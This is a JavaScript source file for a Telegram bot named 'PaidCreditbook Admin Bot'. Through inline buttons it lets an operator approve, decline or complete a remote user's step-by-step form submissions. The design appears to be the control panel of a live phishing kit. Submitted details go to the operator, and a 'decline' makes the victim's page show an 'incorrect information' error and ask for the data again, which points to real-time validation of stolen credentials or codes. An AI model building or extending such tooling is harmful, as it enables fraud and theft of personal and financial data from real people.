/**
 * ============================================================
 *  Telegram Bot Polling & Interactive Action Handler
 * ============================================================
 */

const fetch = require('node-fetch');
const { BOT_TOKEN, CHAT_ID, loadState, saveState, resetState } = require('./config');

let isPolling = false;
let pollingOffset = 0;

/**
 * Answer a callback query (removes loading state on button in Telegram)
 */
async function answerCallbackQuery(callbackQueryId, text = '', showAlert = false) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
                text: text,
                show_alert: showAlert
            })
        });
    } catch (err) {
        console.error('Failed to answer callback query:', err.message);
    }
}

/**
 * Send a direct Telegram reply to a specific chat ID
 */
async function sendToChat(chatId, text, replyMarkup = null) {
    try {
        const body = {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        };
        if (replyMarkup) body.reply_markup = replyMarkup;

        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return await res.json();
    } catch (err) {
        console.error('Error sending to chat:', err.message);
        return { ok: false, error: err.message };
    }
}

/**
 * Process a single Telegram update
 */
async function handleUpdate(update) {
    // 1. Handle Messages (e.g. /start, /id, /status)
    if (update.message) {
        const msg = update.message;
        const senderChatId = String(msg.chat.id);
        const text = (msg.text || '').trim();

        if (text === '/start' || text === '/id' || text === '/help') {
            const isTarget = senderChatId === String(CHAT_ID);
            let reply = `👋 <b>PaidCreditbook Admin Bot</b>\n\n`;
            reply += `🆔 <b>Your Chat ID:</b> <code>${senderChatId}</code>\n`;
            reply += `⚙️ <b>Configured Chat ID:</b> <code>${CHAT_ID}</code>\n\n`;

            if (isTarget) {
                reply += `✅ <b>Status: Active & Authorized!</b>\nYou will receive live form submissions here with interactive approval buttons.`;
            } else {
                reply += `⚠️ <b>Notice:</b> Your Chat ID does not match the configured <code>CHAT_ID</code> in <code>config.js</code>.\n\n`;
                reply += `To receive notifications, please update <code>CHAT_ID</code> in <code>config.js</code> to <code>${senderChatId}</code> or set <code>TG_CHAT_ID=${senderChatId}</code>.`;
            }

            await sendToChat(senderChatId, reply);
            return;
        }

        if (text === '/status') {
            const state = loadState();
            let reply = `📊 <b>Current Session State:</b>\n`;
            reply += `• Step: <b>${state.step}</b>\n`;
            reply += `• Status: <b>${state.status}</b>\n`;
            reply += `• Last Updated: <b>${new Date((state.updated || 0) * 1000).toLocaleTimeString()}</b>`;
            await sendToChat(senderChatId, reply);
            return;
        }
    }

    // 2. Handle Inline Button Clicks (Callback Queries)
    if (update.callback_query) {
        const cq = update.callback_query;
        const action = cq.data;
        const chatId = cq.message ? cq.message.chat.id : cq.from.id;
        const messageId = cq.message ? cq.message.message_id : null;

        const state = loadState();

        if (action === 'action_approve') {
            // Advancing user to next step
            state.status = 'filling';
            saveState(state);

            await answerCallbackQuery(cq.id, '✅ Approved! User is proceeding to next step.', false);

            if (messageId) {
                await sendToChat(chatId, `✅ <b>Step ${state.step} APPROVED</b> by admin. User will now see next form.`);
            }
        } else if (action === 'action_decline') {
            // Asking user to re-enter
            state.status = 'declined';
            saveState(state);

            await answerCallbackQuery(cq.id, '❌ Declined! User prompted to re-enter details.', false);

            if (messageId) {
                await sendToChat(chatId, `❌ <b>Step ${state.step} DECLINED</b>. User will see incorrect information error.`);
            }
        } else if (action === 'action_done') {
            // Complete entire flow
            state.status = 'done';
            saveState(state);

            await answerCallbackQuery(cq.id, '🏁 Marked as Completed!', true);

            if (messageId) {
                await sendToChat(chatId, `🏁 <b>Flow COMPLETED</b>. User screen shows success.`);
            }
        } else if (action === 'action_reset') {
            resetState();
            await answerCallbackQuery(cq.id, '🔄 State reset to initial.', false);
            if (messageId) {
                await sendToChat(chatId, `🔄 <b>State has been RESET</b>.`);
            }
        }
    }
}

/**
 * Long-polling loop for Telegram updates
 */
async function pollUpdates() {
    if (!isPolling) return;

    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${pollingOffset}&timeout=20`;
        const res = await fetch(url);
        const data = await res.json();

        if (data.ok && Array.isArray(data.result)) {
            for (const update of data.result) {
                pollingOffset = update.update_id + 1;
                await handleUpdate(update);
            }
        } else if (!data.ok) {
            console.warn('Telegram poll warning:', data.description || data);
            await new Promise(r => setTimeout(r, 5000));
        }
    } catch (err) {
        await new Promise(r => setTimeout(r, 3000));
    }

    if (isPolling) {
        setImmediate(pollUpdates);
    }
}

/**
 * Start bot polling
 */
function startBotPolling() {
    if (isPolling) return;
    isPolling = true;
    console.log('🤖 Telegram Bot listener initialized. Listening for actions & /start...');
    pollUpdates();
}

/**
 * Stop bot polling
 */
function stopBotPolling() {
    isPolling = false;
}

module.exports = {
    startBotPolling,
    stopBotPolling,
    sendToChat,
    handleUpdate
};
